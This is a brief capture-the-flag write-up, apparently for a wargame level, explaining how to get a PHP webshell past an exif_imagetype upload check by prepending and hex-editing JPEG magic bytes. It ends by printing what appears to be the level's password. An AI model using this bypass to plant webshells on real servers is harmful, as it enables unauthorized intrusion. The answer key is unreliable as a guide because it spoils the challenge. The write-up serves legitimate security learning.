# Solution
This one is a little tricker than Level12, however, uses the exact same FE principle with Level12.

The only difference is that it checks for Magic Bytes now.

```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";  
    }
```

It is an easy bypass, we need to create a jpeg from a php file with `cp` command:
```
cp php_webshell.php ./php_webshell.jpeg
```

`nano php_webshell.jpeg` and append on the first line any 4 characters.

then `hexedit php_webshell.jpeg`. Change the hex values of the first 4 to be: `FF D8 FF EE`

And the shell is ready for exploit

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```